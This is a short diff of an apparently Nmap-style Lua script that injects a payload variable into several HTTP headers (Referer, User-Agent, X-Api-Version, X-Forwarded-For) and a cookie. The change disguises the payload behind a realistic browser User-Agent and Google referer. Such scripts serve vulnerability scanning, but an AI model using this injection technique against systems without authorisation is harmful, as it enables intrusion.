@@ -52,14 +52,14 @@ action = function(host, port)
 
   local request_opts = {
     header = {
-      Referer = payload,
+      Referer = "https://www.google.com " .. payload,
       Connection = "close"
     },
     bypass_cache = true,
     no_cache = true
   }
 
-  request_opts['header']['User-Agent'] = payload
+  request_opts['header']['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36; " .. payload
   request_opts['header']['X-Api-Version'] = payload
   request_opts['header']['X-Forwarded-For'] = payload
   local pcookie = "SessCookie=" .. payload
